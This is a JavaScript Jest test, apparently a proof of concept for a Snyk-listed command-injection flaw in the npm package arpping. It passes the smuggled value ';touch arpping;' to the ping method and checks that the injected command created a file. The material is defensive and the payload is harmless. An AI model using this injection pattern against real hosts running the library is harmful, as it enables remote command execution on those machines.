//https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047
test("Remote code execution in arpping", () => {
  const Arpping = require("arpping");
  const fs = require("fs");
  const path = "./arpping";
  const sleep = require("sleep");
  let arpping = new Arpping();

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    arpping.ping([";touch arpping;"]);
  } catch (error) {}

  sleep.sleep(3);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
